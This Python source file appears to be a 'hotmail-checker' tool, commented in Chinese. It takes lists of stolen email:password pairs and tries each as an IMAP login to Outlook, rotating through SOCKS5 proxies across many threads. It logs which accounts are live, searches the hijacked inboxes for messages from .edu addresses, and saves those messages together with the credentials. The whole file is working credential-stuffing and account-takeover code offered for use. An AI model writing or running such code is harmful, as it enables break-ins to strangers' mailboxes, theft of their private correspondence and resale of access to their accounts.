import concurrent.futures
import email
import imaplib
import os
import random
import socket
from datetime import datetime

import socks
import yaml
from colorama import Fore
from dateutil.relativedelta import relativedelta

from hotmail import Hotmail
from utils import log_message, move_files
from zpush import Push

with open('config/config.yaml', 'r') as file:
    config = yaml.safe_load(file)

proxies_dir = config['checker']['proxies_dir']
edu_emails_dir = config['checker']['edu_emails_dir']
dead_emails_dir = config['checker']['dead_emails_dir']
live_emails_dir = config['checker']['live_emails_dir']
save_emails_dir = config['checker']['save_emails_dir']
log_level = config['checker']['log_level']
max_workers = config['checker']['max_workers']
mode = config['checker'].get('mode', 'loose')
search_terms = config['checker'].get('search_terms', ['edu'])


class EmailChecker:
    def __init__(self):
        self.mailboxes = []
        self.proxies = []
        self.start_time = None
        self.email_count = 0
        self.live_count = 0
        self.dead_count = 0
        self.edu_count = 0
        self.proxy = False
        self.live_mailboxes = []

    @staticmethod
    def load_file(file_path):
        try:
            with open(file_path, 'r') as file:
                return {line.strip() for line in file if line.strip()}
        except FileNotFoundError:
            os.makedirs(os.path.dirname(file_path), exist_ok=True)
            with open(file_path, 'w') as file:
                pass  # 创建空文件
            return set()  # 返回空集合

    @staticmethod
    def log_successful_match(email_address, password, from_address):
        with open('out/plus.txt', 'a') as file:
            file.write(f'{email_address} : {password} -> {from_address}\n')

    def load_proxies(self):
        if not self.load_file(proxies_dir):
            log_message("No proxies found in proxies.txt", color=Fore.RED)
            return
        self.proxies = list(self.load_file(proxies_dir))
        self.proxy = True
        log_message(f"Loaded {len(self.proxies)} proxies from proxies.txt", color=Fore.LIGHTBLUE_EX)

    @staticmethod
    def save_email_content(email_address, from_address, email_message):
        email_filename = f"{save_emails_dir}{email_address.replace('@', '_')}_{from_address.replace('@', '_')}.txt"
        email_body = ''
        if email_message.is_multipart():
            for part in email_message.walk():
                if part.get_content_type() == 'text/plain':
                    email_body = part.get_payload(decode=True)
        else:
            email_body = email_message.get_payload(decode=True)
        with open(email_filename, 'w') as email_file:
            email_file.write(email_body.decode())

    def get_random_proxy(self):
        proxy_parts = random.choice(self.proxies).split(':')
        address = proxy_parts[0]
        port = int(proxy_parts[1])
        username = 1
        password = 1
        if len(proxy_parts) > 3:
            username = proxy_parts[2]
            password = proxy_parts[3]
        return address, port, username, password

    def check_login(self, email_address, email_password, max_retries=3):
        retries = 0
        while retries < max_retries:
            try:
                imap_server = "outlook.office365.com"
                imap_port = 993
                socket.setdefaulttimeout(30)
                if self.proxy:
                    address, port, username, password = self.get_random_proxy()
                    if username == 1 and password == 1:
                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, address, port)
                    else:
                        socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, address, port, username=username,
                                              password=password)
                        socket.socket = socks.socksocket
                        log_message(f"Using proxy {address}:{port}", color=Fore.LIGHTBLUE_EX, enable=int(log_level) - 2)
                mail = imaplib.IMAP4_SSL(imap_server, imap_port)
                mail.login(email_address, email_password)
                return mail, None
            except imaplib.IMAP4.error as e:
                error_message = f" IMAP4.error {str(e)}"
                retries += 1
                if retries == max_retries:
                    return None, error_message
            except Exception as e:
                error_message = f"{str(e)}"
                retries += 1
                if retries == max_retries:
                    return None, error_message

    def check_edu_mailbox(self, email_address, password, mail, max_check_time):
        start_time = datetime.now()
        mail_count = 0
        try:
            mail.select('INBOX')
            start_date = datetime(2014, 1, 1)
            end_date = datetime(2024, 1, 1)

            while start_date <= end_date:
                if (datetime.now() - start_time).total_seconds() > max_check_time:
                    log_message(f"{email_address} : {password} -> Reached maximum check time.",
                                color=Fore.LIGHTRED_EX)
                    break
                all_results = []
                for term in search_terms:
                    search_criteria = f'(SEEN SENTSINCE "{start_date.strftime("%d-%b-%Y")}" SENTBEFORE "{(start_date + relativedelta(months=1)).strftime("%d-%b-%Y")}" OR FROM "{term}" OR BODY {term} ")'
                    _, message_numbers = mail.search(None, search_criteria)
                    all_results.extend(message_numbers[0].split())
                all_results = list(set(all_results))  # 去除重复的结
                mail_count += len(all_results)

                for num in reversed(message_numbers[0].split()):
                    _, msg = mail.fetch(num, '(RFC822)')
                    email_body = msg[0][1]
                    email_message = email.message_from_bytes(email_body)

                    from_address = email_message['From']
                    # 查找@后面是否有.edu
                    if self.check_edu_email(from_address, mode == 'strict'):
                        self.log_successful_match(email_address, password, from_address)
                        log_message(f"{email_address} : {password} -> EDU Email Found", color=Fore.LIGHTGREEN_EX)
                        self.save_email_content(email_address, from_address, email_message)
                        mail.close()
                        mail.logout()
                        log_message(
                            f"{email_address} : {password} -> Checked {mail_count} emails in {(datetime.now() - start_time).total_seconds()} seconds. ",
                            color=Fore.LIGHTRED_EX)
                        return True

                start_date = start_date + relativedelta(months=1)

            mail.close()
            mail.logout()
            self.email_count += mail_count
            log_message(
                f"{email_address} : {password} -> Checked {mail_count} emails in {(datetime.now() - start_time).total_seconds()} seconds. No EDU email found.",
                color=Fore.LIGHTRED_EX)
            return False
        except imaplib.IMAP4.error as e:
            self.email_count += mail_count
            log_message(f"{email_address} : {password} -> IMAP4.error {str(e)}", color=Fore.WHITE,
                        enable=int(log_level) - 1)
            return False
        except Exception as e:
            self.email_count += mail_count
            log_message(f"{email_address} : {password} -> Error checking EDU emails: {str(e)}", color=Fore.WHITE,
                        enable=int(log_level) - 1)
            return False

    def check_mailbox(self, email_pwd, max_check_time=300):
        e = str(email_pwd).split(':')
        mail, message = self.check_login(e[0], e[1])
        if mail is None:
            with open(dead_emails_dir, 'a') as file:
                file.write(email_pwd + '\n')
            log_message(f"{e[0]} : {e[1]} -> {message}", color=Fore.WHITE, enable=int(log_level) - 2)
            self.dead_count += 1
        else:
            self.live_count += 1
            with open(live_emails_dir, 'a') as file:
                file.write(email_pwd + '\n')
                log_message(f"{e[0]} : {e[1]} -> Login Success", color=Fore.LIGHTBLUE_EX)
            self.live_mailboxes.append(email_pwd)
            if self.check_edu_mailbox(e[0], e[1], mail, max_check_time):
                with open(edu_emails_dir, 'a') as file:
                    file.write(email_pwd + '\n')
                log_message(f"{e[0]} : {e[1]} -> EDU Email Found", color=Fore.LIGHTGREEN_EX)
                self.edu_count += 1
                return

    @staticmethod
    def check_edu_email(email, strict=False):
        if '@' not in email:
            return False
        domain = email.split('@')[1]
        return domain.endswith('.edu') if strict else '.edu' in domain

    def collect_and_send_stats(self):
        # 检查了xx邮箱 有xx个活着的邮箱 有xx个死掉的邮箱 有xx个edu邮箱 检索了xx 封邮件 用时xx分钟
        tips_dict = {
            0.001: "运气太差，邮箱质量太差",
            0.005: "运气不错，邮箱质量一般",
            0.01: "运气太好了吧，邮箱质量很好"
        }
        if len(self.mailboxes) == 0:
            log_message("No mailboxes to check.", color=Fore.LIGHTRED_EX)
            return
        ratio = self.edu_count / len(self.mailboxes)
        tips = next((tips for threshold, tips in tips_dict.items() if ratio < threshold), tips_dict[0.01])
        stats_message = f"检查了{len(self.mailboxes)}邮箱\n" \
                        f"{len(list(set(self.live_mailboxes)))} live {self.dead_count} dead \n" \
                        f"有{self.edu_count} 个edu邮箱 \n" \
                        f"检索了{self.email_count}封邮件 \n" \
                        f"用时{(datetime.now() - self.start_time).total_seconds() / 60} min\n" \
                        f"{tips}"
        log_message(stats_message, color=Fore.LIGHTYELLOW_EX)
        push = Push()
        push.send_message("hotmail-checker ", stats_message)

    def run(self):
        self.mailboxes = Hotmail().load_local_mailboxes()
        self.start_time = datetime.now()
        self.load_proxies()
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            list(executor.map(self.check_mailbox, self.mailboxes))

        self.collect_and_send_stats()

    def run_with_tg(self, my_email_path):
        self.mailboxes = Hotmail().load_tg_mailboxes(my_email_path + '/new')
        self.load_proxies()
        move_files(my_email_path + '/new', my_email_path + '/old')
        self.start_time = datetime.now()
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
            list(executor.map(self.check_mailbox, self.mailboxes))
        self.collect_and_send_stats()
        return list(set(self.live_mailboxes))
